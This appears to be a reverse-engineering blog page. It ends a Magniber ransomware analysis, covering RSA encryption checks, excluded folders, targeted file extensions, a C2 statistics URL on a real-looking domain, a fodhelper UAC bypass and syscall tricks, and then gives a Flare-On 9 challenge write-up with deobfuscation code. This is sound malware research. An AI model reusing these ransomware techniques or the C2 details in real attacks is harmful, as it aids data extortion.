**m =**`00 02 ab 7e 91 79 c1 59 64 2f 7e af 7f c1 59 eb 13 7e af 7f 33 59 b3 0f 79 a1 1d 31 37 b3 0f 8f 9d 1d 35 81 c3 0f 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e 91 7f 33 59 eb 13 79 af 7f 33 37 b3 13 35 59 e7 72 41 f7 eb e5 f4 fb 72 41 f7 93 39 f4 fb ab eb f7 6f 91 ab e1 81 64 41 6f 91 79 c1 81 64 13 7e af 7f 33 72 41 f7 93 e5 f4 fb ab eb 41 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e cd 99 e7 09 97 33 3d 61 3f 79 45 97 33 93 e5 f4 fb ab 41 f7 93 39 ab fb 81 64 41 6f 91 79 c1 81 64 13 7e af 7f 33 37 eb 13 8f a1 1d 31 55 b3 0f 6c e7 c3 35 81 cb cb 6c e7 5d 5b 20 99 b3 ab 83 90 15 69 05 b3 49 5b 8f 62 59 79 0f 49 b3 15 7f 63 41 6c e7 5d 33 20 99 41 ab 33 5d 33 a7 00 f7 93 39 ab e1 81 64 13 7e af 7f 31 37 b3 cb 6c e7 63 3d 05 b3 4b b3 8f 62 6b 59 e9 61 09 f3 33`

The resulting ciphertext:

**c =**`11 2d 19 b0 82 4b 0b 24 88 e8 b7 db 00 1e 84 ef 92 6a b6 1c f2 90 49 df 42 e3 f2 c9 1a e0 9d 92 52 24 00 ad 09 5b 0a 85 0d 68 20 a2 ed 48 f1 2e 88 23 70 d5 d8 15 57 58 ef 94 34 9a 4c 12 79 0f 42 3c bc 5b 0a d1 5b 25 97 ce 67 8a d2 90 4a 87 e1 a8 6c 01 ca 1e 27 f9 4c 62 2a eb 58 89 d9 0e 02 65 9f 42 db 03 f1 7c bf d8 6f eb 09 42 e6 13 d6 e8 82 d6 05 7c c2 26 90 1c 89 2c 70 25 17 a0 7f 23 a1 4e b8 5a 16 f4 53 f8 aa 72 b1 2e 9b 04 1c 4e 33 a3 96 be f1 6f 0e 81 c5 91 3e 49 a2 0e cd 47 75 33 0d 67 6d f9 01 79 8d 43 3b bb 07 ac cf 12 ef ef eb 87 77 4b 9a fa 98 48 d5 1f cf 43 47 05 7f 6b da 16 f3 57 a7 39 f0 78 ec db a6 7e db 64 33 1c a6 b6 a0 8c 3c e5 8a d0 e6 ec da c5 b5 41 69 78 b5 e6 e1 f1 73 6e 5f d6 f7 69 64 16 32 1a ac 02 ee 5e 34 0f 7d f2 d0 cc 3b 55 10 60`

Reproducing the steps with a public tool, at: [https://www.boxentriq.com/code-breaking/modular-exponentiation](https://www.boxentriq.com/code-breaking/modular-exponentiation) :

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_tool_out.png?w=660)

We can see that indeed, our output is identical like the one generated by the malware, so the RSA implementation is correct. No luck this time!

However, since the malware doesn’t generate a new keypair per each victim, and only uses the RSA key hardcoded in the sample, it may be possible to reuse the private key once purchased from the attacker, and share it with other victims of the identical sample.

### What is encrypted

During the check with the help of FLOSS, we found in some directories hardcoded in the shellcode, that will be excluded from the encryption:

```
FLOSS static Unicode strings
[...]
documents and settings
appdata
local settings
sample music
sample pictures
sample videos
tor browser
recycle
windows
boot
intel
msocache
perflogs
program files
programdata
recovery
system volume information
winnt
[...]
```

This list is being used at the beginnign of the function responsible for encrypting directory content:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/excluded_dir.png?w=391)

Yet, our extracted list of strings didn’t contain the attacked extensions – althougt it was clear during the behavioral analysis that not all files are encrypted. Let’s have a closer look at how this distinction is being made:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_check.png)

The filtering of the files is done, by calculating hashes of their extensions, and then comparing them with a hardcoded list.

The function calculating the extension hash:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/calc_ext_hash.png)

The list of the valid extension hashes is hardcoded in the malware. We can find the matching extension just by a brutforce method.

Again, I didn’t want to waste time reimplementing functions responsible for hashing the extensions, and for checking them, so I just plug the functions from the original malware to my code. You can see the brutforcer [here](https://gist.github.com/hasherezade/86dd770cba355e0c4b950268869a5921).

There are two list of extensions that can be selected depending on the flag passed to the function encrypting a directory:

```
List 0:
arc asf avi bak bmp fla flv gif gz iso jpeg jpg mid mkv mov mpeg mpg paq png rar swf tar tbk tgz tif tiff vcd vmdk vob wav wma wmv zip

List 1:
abm abs abw act adn adp aes aft afx agif agp ahd ai aic aim albm alf ans apd apm apng aps apt apx art arw asc ase ask asm asp asw asy aty awdb awp awt aww azz bad bay bbs bdb bdp bdr bean bib bmx bna bnd boc bok brd brk brn brt bss btd bti btr c ca cals can cd cdb cdc cdg cdmm cdmt cdmz cdr cdt cf cfu cgm cimg cin cit ckp clkw cma cmx cnm cnv colz cpc cpd cpg cpp cps cpx crd crt crw cs csr csv csy ct cvg cvi cvs cvx cwt cxf cyi dad daf db dbc dbf dbk dbs dbt dbv dbx dca dcb dch dcr dcs dct dcx dd dds ded der dgn dgs dgt dhs dib dif dip diz djv djvu dmi dmo dnc dne doc docb docm docx docz dot dotm dotx dpp dpx dqy drw drz dsk dsn dsv dt dta dtsx dtw dv dvi dwg dx dxb dxf eco ecw ecx edb efd egc eio eip eit em emd emf emlx ep epf epp eps epsf eq erf err etf etx euc exr fa faq fax fb fbx fcd fcf fdf fdr fds fdt fdx fdxt fes fft fi fic fid fif fig flr fmv fo fodt fpos fpt fpx frm frt frx ftn fwdn fxc fxg fzb fzv gcdp gdb gdoc gem geo gfb gfie ggr gih gim gio glox gpd gpg gpn gro grob grs gsd gthr gtp gv gwi h hbk hdb hdp hdr hht his hp hpg hpi hs htc hwp hz ib ibd icn icon icpr idc idea idx igt igx ihx ii iiq imd info ink ipf ipx itdb itw iwi j jar jas java jbig jbmp jbr jfif jia jis jng joe jpe jps jpx jrtf js jsp jtf jtx jw jxr kdb kdbx kdc kdi kdk kes key kic klg knt kon kpg kwd lay lbm lbt ldf lgc lis lit ljp lmk lnt lrc lst ltr ltx lue luf lwo lwp lws lyt lyx ma mac man map maq mat max mb mbm mbox mdb mdf mdn mdt me mef mel mft mgcb mgmf mgmt mgmx mgtx min mm mmat mnr mnt mos mpf mpo mrg mrxs msg mud mwb mwp mx my myd myi ncr nct ndf nef nfo njx nlm now nrw nsf nyf nzb obj oce oci ocr odb odg odm odo odp ods odt of oft omf oplc oqy ora orf ort orx ost ota otg oti otp ots ott ovp ovr owc owg oyx ozb ozj ozt p pa pan pano pap pas pbm pcd pcs pdb pdd pdf pdm pds pdt pef pem pff pfi pfs pfv pfx pgf pgm phm php pic pict pix pjpg pjt plt pm pmg pni pnm pntg pnz pobj pop pot potm potx ppam ppm pps ppsm ppsx ppt pptm pptx prt prw psd psdx pse psid psp pst psw ptg pth ptx pu pvj pvm pvr pwa pwi pwr px pxr pza pzp pzs qd qmg qpx qry qvd rad ras raw rb rctd rcu rd rdb rft rgb rgf rib ric riff ris rix rle rli rng rpd rpf rpt rri rs rsb rsd rsr rst rt rtd rtf rtx run rw rzk rzn saf sam sbf scad scc sch sci scm sct scv scw sdb sdf sdm sdoc sdw sep sfc sfw sgm sh sig skm sla sld sldm sldx slk sln sls smf sms snt sob spa spe sph spj spp spq spr sq sqb srw ssa ssk st stc std sti stm stn stp str stw sty sub suo svf svg svgz sxc sxd sxg sxi sxm sxw tab tcx tdf tdt te tex text thp tlb tlc tm tmd tmv tmx tne tpc trm tvj udb ufr unx uof uop uot upd usr utxt vb vbr vbs vct vdb vdi vec vm vmx vnt vpd vrm vrp vsd vsdm vsdx vsm vstm vstx vue vw wbk wcf wdb wgz wire wks wmdb wn wp wpa wpd wpg wps wpt wpw wri wsc wsd wsh wtx x xar xd xdb xlc xld xlf xlgc xlm xls xlsb xlsm xlsx xlt xltm xltx xlw xps xwp xyp xyw ya ybk ym zabw zdb zdc zw
```

The encrypting function is going to be called twice, each time a different list is enabled:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/encrypting_attempts.png?w=420)

So, both lists are going to be used.

## Communication with the C2

The malware comes with an ability to communicate with the C2, for the purpose of upload of the statistics. After the series of encryption has finished, and if at least 100 files got encrypted, it sends an information about it to the server:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/upload_stats.png?w=656)

The passed data, including the unique victim ID, and various counts of the attacked targets, is merged together to create a URL. Example:

```
L"http://8e50de00b650821vieijibfm.jobsoon.fun/vieijibfm&2&1367508359&14525&55144&2219043"
```

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/query_url.png)

The base URL (`jobsoon.fun`) is hardcoded in the sample as a stack-based string, similarly to the name of the DLL to be loaded: `wininnet.dll`, that will be used for the internet connection.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/stack_based_strings.png?w=486)

The relevant functions are loaded by their hashes, using the common technique involbing PEB lookup (similat to [this one](https://github.com/hasherezade/demos/tree/master/functions_loader)).

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/get_by_hash.png?w=411)

## Privilege elevation

The UAC bypass attempt involving fodhelper.exe (based on the PoC: [FodhelperBypass.ps1](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1).), that we observed during the tracing is executed between two series of files encryption. First the malware is trying to encrypt files without elevating the privileges. After it finished, it makes attempt to deploy the UAC bypass (without any prior checks if it is required). Then another attempt of deploying the encryption functions is being made.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png)

## Usage of KUSER\_SHARED\_DATA

While analyzing the code, we can see references to some hardcoded memory address. Example:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=734)

This address resolves to KUSER\_SHARED\_DATA:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=467)

`KUSER_SHARED_DATA` is a read-only memory page, containing a structure with many intresting information about the system, that is mapped both in the user mode and the kernel mode (more info [here](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data) and [here](https://osm.hpi.de/wrk/2007/08/getting-os-information-the-kuser_shared_data-structure/)).

A convenient dump of the whole structure for a current system can be done with the help of WinDbg – example [here](https://gist.github.com/hasherezade/ced8835e3da33d83b7f17d312f2a7d53). We can further use this dump to resolve what field is referenced by a particual address.

### Windows Build Number and syscalls selection

One of the fields that is quite often used by the malware is `NtBuildNumber`. It is first used at the beginning of the shellcode – if the build number was lower than the hardcoded one, the malware won’t run at all:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png)

This makes sense, because the numbers of syscalls may differ depending on Windows version – and this malware have them hardcoded. In order to guarantee a backward compatibility, the authors would have to retrieve the syscall numbers automatically from `ntdll`. Clearly they wanted to avoid this hassle. As a result, all Windows version below 10 will be spared from this attack.

There are some cases, when still the proper syscall number need to be adjusted to a particular version of Windows. In order to do it, they just select a number of the syscall from multiple options, basing on the retrieved Windows build. Such implementation is used i.e. in case of `NtUserSystemParametersInfo` :

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png)

…which is used for changing the wallpaper:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=591)

### Time checks

`KUSER_SHARED_DATA` also provides an access to a system clock, so it can be used for various time checks:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png)

# Conclusion

In the current blog I wanted to demonstrate, how tracing with the help of [Tiny Tracer](https://github.com/hasherezade/tiny_tracer) can speed up the analysis process. It does not only give a high level overview of what is happening inside, but also it allows to quickly find where the relevant code is located in the binary. The generated tags can help us annotate the code in disassemblers and debuggers, helping to understand functions that are resolved dynamically, or like in the current case, by syscalls. I also demonstrate how to overcome some problems that can interfere with tracing.

In addition to tracing, I demonstrated some of my other tools that can be useful in the analysis process – such as [PE-sieve](https://github.com/hasherezade/pe-sieve)/ [HollowsHunter](https://github.com/hasherezade/hollows_hunter) for dumping of the injected shellcode.

Additionally, we analyzed the main shellcode of Magniber, containing the implementation of the files encryption. This shellcode ( [#2](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)) is the part being injected to other processes. Note, that Magniber has yet another shellcode ( [#1](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)), that is responsible for doing the the process injection. This shellcode showed up in the tracing. Yet, I am leaving its detailed analysis as an exercise to the reader.

Posted in [Malware](https://hshrzd.wordpress.com/category/malware/), [Tutorial](https://hshrzd.wordpress.com/category/tutorial/)\|Tagged [ransomware](https://hshrzd.wordpress.com/tag/ransomware/), [TinyTracer](https://hshrzd.wordpress.com/tag/tinytracer/)\|[3 Comments](https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/#comments)

## [Flare-On 9 – Task 8](https://hshrzd.wordpress.com/2022/11/12/flare-on-9-task-8/)

Posted on [November 12, 2022](https://hshrzd.wordpress.com/2022/11/12/flare-on-9-task-8/ "5:19 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_For those of you who don’t know, Flare-On is an annual “reverse engineering marathon” organized by Mandiant (formerly by FireEye). It runs for 6 weeks, and contains usually 10-12 tasks of increasing difficulty. This year I completed as 103 (solves board [here](https://twitter.com/hasherezade/status/1579131946965553152?s=20&t=_vUSLujWGnlN_2YAmYdn3w)). In this short series you will find my solutions of the tasks I enjoyed the most._

Unquestionably, the most interesting and complex challenge of this year was the 8th one.

> You can find the package here: [08\_backdoor.7z](https://drive.google.com/file/d/1Oqqpoce09bMrYNXU7mysuOGxeGLJIZHe/view?usp=sharing) , password: `flare`

## Overview

This challenge is a PE written in .NET. Even at first sight we can see it is some atypical. It contains 74 sections. In addition to the standard sections like `.text`, `.rsrc` and `.reloc`, there are sections that clearly contain some encrypted/obfuscated content. Their names look like some byte strings (that could be checksums or fragments of hashes).

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flareon_backdoor_pe.png?w=956)

As usually when encountering a .NET file, I opened it in dnSpy to have a look at the decompiled code.

The program contains multiple classes with a names starting with “FLARE”:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/classes_list.png?w=249)

## Deobfuscating the stage 1

The Entry Point is in the class named `Program`. Looking inside we can realize that the bytecode of most of the methods is obfuscated, and can’t be decompiled with dnSpy:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/program_main.png?w=730)

It looks very messy and intimidating, but we still have some methods that haven’t been obfuscated, so let’s start from those ones.

The function that is executed first, `FLARE15.flare_74` , initializes some tables, that are going to be used further:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/init_lists.png?w=605)

The next function to be executed, `Program.flared_38`, can’t be decompiled. So I previewed the CIL code, to check if it makes any sense:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/show_il_code.png?w=772)

It doesn’t – we can see some instructions that are marked as UNKNOWN. So we can assume, that this function is here only to throw an exception, and the meaningful code is going to be in the exception handler. So, let’s take a look there.

The function `flare_70` that is executed in the exception handler, follows the same logic. It calls a function `flared_70` which contains invalid, nonsensical code, just to trigger an exception.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flare_70.png?w=876)

And then, in the exception handler, `flare_71` is executed. It gets as parameters two of the global variables, that were initialized in the `Main`, by the function `FLARE15.flare_74`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/except_flare_71.png?w=337)

The first of those passed variables is a dictionary, and the other – an array of bytes.

Fortunately, this rabbit-hole doesn’t go deeper for now, and the function `flare_71` contains a meaningful code:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | // Token: 0x060000BC RID: 188 RVA: 0x00013EB8 File Offset: 0x0001AEB8 |
|  | public static object flare\_71(InvalidProgramException e, object\[\] args, Dictionary<uint, int> m, byte\[\] b) |
|  | { |
|  | StackTrace stackTrace = new StackTrace(e); |
|  | int metadataToken = stackTrace.GetFrame(0).GetMethod().MetadataToken; |
|  | Module module = typeof(Program).Module; |
|  | MethodInfo methodInfo = (MethodInfo)module.ResolveMethod(metadataToken); |
|  | MethodBase methodBase = module.ResolveMethod(metadataToken); |
|  | ParameterInfo\[\] parameters = methodInfo.GetParameters(); |
|  | Type\[\] array = new Type\[parameters.Length\]; |
|  | SignatureHelper localVarSigHelper = SignatureHelper.GetLocalVarSigHelper(); |
|  | for (int i = 0; i < array.Length; i++) |
|  | { |
|  | array\[i\] = parameters\[i\].ParameterType; |
|  | } |
|  | Type declaringType = methodBase.DeclaringType; |
|  | DynamicMethod dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, array, declaringType, true); |
|  | DynamicILInfo dynamicILInfo = dynamicMethod.GetDynamicILInfo(); |
|  | MethodBody methodBody = methodInfo.GetMethodBody(); |
|  | foreach (LocalVariableInfo localVariableInfo in methodBody.LocalVariables) |
|  | { |
|  | localVarSigHelper.AddArgument(localVariableInfo.LocalType); |
|  | } |
|  | byte\[\] signature = localVarSigHelper.GetSignature(); |
|  | dynamicILInfo.SetLocalSignature(signature); |
|  | foreach (KeyValuePair<uint, int> keyValuePair in m) |
|  | { |
|  | int value = keyValuePair.Value; |
|  | uint key = keyValuePair.Key; |
|  | bool flag = value >= 1879048192 && value < 1879113727; |
|  | int tokenFor; |
|  | if (flag) |
|  | { |
|  | tokenFor = dynamicILInfo.GetTokenFor(module.ResolveString(value)); |
|  | } |
|  | else |
|  | { |
|  | MemberInfo memberInfo = declaringType.Module.ResolveMember(value, null, null); |
|  | bool flag2 = memberInfo.GetType().Name == "RtFieldInfo"; |
|  | if (flag2) |
|  | { |
|  | tokenFor = dynamicILInfo.GetTokenFor(((FieldInfo)memberInfo).FieldHandle, ((TypeInfo)((FieldInfo)memberInfo).DeclaringType).TypeHandle); |
|  | } |
|  | else |
|  | { |
|  | bool flag3 = memberInfo.GetType().Name == "RuntimeType"; |
|  | if (flag3) |
|  | { |
|  | tokenFor = dynamicILInfo.GetTokenFor(((TypeInfo)memberInfo).TypeHandle); |
|  | } |
|  | else |
|  | { |
|  | bool flag4 = memberInfo.Name == ".ctor" \|\| memberInfo.Name == ".cctor"; |
|  | if (flag4) |
|  | { |
|  | tokenFor = dynamicILInfo.GetTokenFor(((ConstructorInfo)memberInfo).MethodHandle, ((TypeInfo)((ConstructorInfo)memberInfo).DeclaringType).TypeHandle); |
|  | } |
|  | else |
|  | { |
|  | tokenFor = dynamicILInfo.GetTokenFor(((MethodInfo)memberInfo).MethodHandle, ((TypeInfo)((MethodInfo)memberInfo).DeclaringType).TypeHandle); |
|  | } |
|  | } |
|  | } |
|  | } |
|  | b\[(int)key\] = (byte)tokenFor; |
|  | b\[(int)(key + 1U)\] = (byte)(tokenFor >> 8); |
|  | b\[(int)(key + 2U)\] = (byte)(tokenFor >> 16); |
|  | b\[(int)(key + 3U)\] = (byte)(tokenFor >> 24); |
|  | } |
|  | dynamicILInfo.SetCode(b, methodBody.MaxStackSize); |
|  | return dynamicMethod.Invoke(null, args); |
|  | } |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/flare_71.cs) [flare\_71.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-flare_71-cs)
hosted with ❤ by [GitHub](https://github.com/)

By analyzing the code we finally come to know what is happening here. The function that has thrown the exception, along with its prototype, is retrieved, as well as the parameters that were passed to it.

Then, a dynamic method is created, as a replacement, using the values passed as `flare_71` arguments (`FLARE15.wl_m`, `FLARE15.wl_b` in the analyzed case). The last function parameter, containing the byte array, is in fact a bytecode of the new method.

Finally, the newly created dynamic function is called, with the same prototype and arguments as the function that thrown the exception that leaded to here:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/invoke_dynamic.png?w=500)

Creation of the dynamic function:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/relace_func-2.png?w=922)

So, if we manage to get the code that was about to be executed, and fill it in on the place of the nonsensical code, we could get the function decompiled, and the flow deobfuscated.

I found 7 functions total that were obfuscated in the same way:

1. `flared_35`
2. `flared_47`
3. `flared_66`
4. `flared_67`
5. `flared_68`
6. `flared_69`
7. `flared_70`

My first thought was to just dump the code before the execution, and fill it in at the offset where the original function was located. I tried to do it, and although the code that I got looked like a valid IL code, still something was clearly wrong. Some of the functions (i.e. `flared_70` ) decompiled correctly, but had fragments that were not making sense:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/invalid_deobf.png?w=809)

Other function wasn’t decompiling. When I looked at the bytecode preview, I noticed that some references inside are clearly invalid:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/invalid2.png?w=763)Invalid function – .NET bytecode viewed in IDA

But why is it so, if I dumped exactly the same code that worked fine while dynamically executed? Well – there is a catch ( _thanks to [Alex Skalozub](https://twitter.com/pieceofsummer) for a hint on this!_). Before the function can be executed, all the referenced tokens need to be rebased. This is the responsible fragment:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/rebase_tokens.png?w=523)

When the function was prepared to be executed dynamically, they were rebased to that dynamic token. To be able to fill it in, back to the place of the static function, we need to rebase them to the original, static function’s token. This modified version of the function does the job:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | public static byte\[\] flare\_71(Dictionary<uint, int> m, byte\[\] b) |
|  | { |
|  | foreach (KeyValuePair<uint, int> keyValuePair in m) |
|  | { |
|  | int value = keyValuePair.Value; |
|  | uint key = keyValuePair.Key; |
|  | int tokenFor = value; |
|  |  |
|  | b\[(int)key\] = (byte)tokenFor; |
|  | b\[(int)(key + 1U)\] = (byte)(tokenFor >> 8); |
|  | b\[(int)(key + 2U)\] = (byte)(tokenFor >> 16); |
|  | b\[(int)(key + 3U)\] = (byte)(tokenFor >> 24); |
|  | } |
|  | return b; |
|  | } |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/flare_71_modified.cs) [flare\_71\_modified.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-flare_71_modified-cs)
hosted with ❤ by [GitHub](https://github.com/)

I implemented a simple decoder, basing on the original, decompiled code, plus the modified version of `flare_71`. The decoder was initializing all the global variables, and then calling the function `flare_71` with parameters appropriate for a particular function. After that the resut was saved into a file.

[https://github.com/hasherezade/flareon2022/blob/8f6a3d3d60c1cc77648c57c1ed20896b3516588c/task8/code/Program.cs#L31](https://github.com/hasherezade/flareon2022/blob/8f6a3d3d60c1cc77648c57c1ed20896b3516588c/task8/code/Program.cs#L31)

Example – decoded bytecode for the function `flared_70`:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flared_70_decoded.png?w=626)

There were only 7 functions to be filled at this stage, so I decided to copy-paste the resulted bytecode manually. The file offset where the function starts can be found in dnSpy:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/func_offset.png?w=644)

However, we need to take into consideration that that the function starts with a header, and then the bytecode follows. We can see this layout in dnSpy hexeditor:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/dnspy_hex_view.png?w=573)

So, in above function, the bytecode starts at the offset 0x1AE10, and this is where we can copy the decoded content. As we can see, the size of the decoded bytecode is exactly the same as the size of the nonsensical code that was used as the filler – that makes this whole operation possible.

The same method filled with the decoded body:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/method_filled.png?w=557)

After pasting all the fragments we can see a big progress – all the 7 functions decompiled fine!

Yet – this is just a beginning, because there is another stage to be deobfuscated…

## Deobfuscating the stage 2

Now, after deobfuscating the function \`flared\_70\` we can see what is happening there.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flared_70_decompiled.png?w=628)

The function `flare_66` that is called first, is responsible for calculating a SHA256 hash from a body of the obfuscated function which has thrown the exception:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flared_66.png?w=746)

Then, the function `flared_69` takes this hash, and enumerate all the PE sections, searching for the section names exactly like the beginning of that hash. The body of this section is being read:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flared_69.png?w=836)

The function `flared_47` (called by `flare_46` ) decodes the read section’s content:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flared_47.png?w=576)

And finally, the function `flared_67` uses the decoded content and creates a dynamic function to be called, out of the supplied bytecode.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/67_dynamic_code.png?w=502)

Full function snippet [here](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-flared_67-cs).

It turns out that we need to decode it analogous to the previous layer.

This time the original token is first decoded:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/original_token.png)

So, this is the value that we need to use as a token for the static version of the function:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | `uint``num = (``uint``)FLARE15.flared_68(b, j);`<br>`num ^= 2727913149U;`<br>`uint``tokenFor = num;``// use decoded num as a token`<br>`b[j] = (``byte``)tokenFor;`<br>`b[j + 1] = (``byte``)(tokenFor >> 8);`<br>`b[j + 2] = (``byte``)(tokenFor >> 16);`<br>`b[j + 3] = (``byte``)(tokenFor >> 24);`<br>`j += 4;`<br>`break``;` |

This time, the number of the functions to be filled is much bigger than in the previous layer, making filling it by hand inefficient and unreasonable.

There are various ways to automate it.

For automating the decoding of the body of each function, I used .NET reflection. I loaded the challenge executable (with the stage 1 patched) from the disk, and retrieved the list of all included types. Then walked through that list, filtering out non-static types, and those with names not starting from `flared_` (which was a prefix of every obfuscated function):

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | Assembly a = Assembly.LoadFrom(fileToPatch); |
|  | Module\[\] m = a.Modules.ToArray(); |
|  | if (m.Length == 0) return false; |
|  | Module module = m\[0\]; |
|  |  |
|  | Type\[\] tArray = module.FindTypes(Module.FilterTypeName, "\*"); |
|  |  |
|  | int notFound = 0; |
|  |  |
|  | foreach (Type t in tArray) |
|  | { |
|  | foreach (MethodInfo mi in t.GetMethods()) |
|  | { |
|  | var metadataToken = mi.MetadataToken; |
|  | string name = mi.Name; |
|  | if (!mi.IsStatic) { continue; } |
|  | if (!name.StartsWith("flared\_")) { continue; } |
|  |  |
|  | // Do the stuff |
|  | } |
|  | } |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/snippet1.cs) [snippet1.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-snippet1-cs)
hosted with ❤ by [GitHub](https://github.com/)

This is how I got the list of methods to be deobfuscated. I could retrieve their deobfuscated bodies pretty easily, by applying the (slightly modified) original functions, that were discussed above: calculating the hash of the content, finding proper section, decoding it).

Still the remaining problem to be solved, was to automatically patch the executable with the decoded contents. Probably the most elegant solution here would be to use [dnlib](https://github.com/0xd4d/dnlib). What I did was more “hacky” but nevertheless it worked fine. I decided to make a lookup table of the file offsets where the functions were located. As we saw earlier, those offsets are given as a comments generated by dnSpy. So, I saved the full decompiled project from dnSpy, and then used the `grep` to filter the lines with the file offsets. Post-processed the output a bit, in a simple text editor, and as a result I’ve got the following table: [file\_offsets.txt](https://github.com/hasherezade/flareon2022/blob/8f6a3d3d60c1cc77648c57c1ed20896b3516588c/task8/file_offsets.txt). Now this table needs to be read by the decoder, and parsed into a dictionary:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | static Dictionary<int, int> createMapOfTokens(string tokensFile) |
|  | { |
|  | string tokenStr = "Token: "; |
|  | string offsetStr = "File Offset: "; |
|  | string sepStr = " RID:"; |
|  | var tokenToOffset = new Dictionary<int, int>(); |
|  | foreach (string line in System.IO.File.ReadLines(tokensFile)) |
|  | { |
|  | int tokenStart = line.IndexOf(tokenStr); |
|  | int sep = line.IndexOf(sepStr); |
|  | int offsetStart = line.IndexOf(offsetStr); |
|  |  |
|  |  |
|  | int len = sep – (tokenStart + tokenStr.Length); |
|  | string tokenPart = line.Substring(tokenStart + tokenStr.Length, len); |
|  | string offsetPart = line.Substring(offsetStart + offsetStr.Length); |
|  |  |
|  | int tokenVal = Convert.ToInt32(tokenPart, 16); |
|  | int offsetVal = Convert.ToInt32(offsetPart, 16); |
|  |  |
|  | Console.WriteLine(System.String.Format(@"Adding: '{0}' '{1:X}'", tokenPart, offsetVal)); |
|  |  |
|  | tokenToOffset\[tokenVal\] = offsetVal; |
|  | } |
|  | return tokenToOffset; |
|  | }; |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/map_tokens.cs) [map\_tokens.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-map_tokens-cs)
hosted with ❤ by [GitHub](https://github.com/)

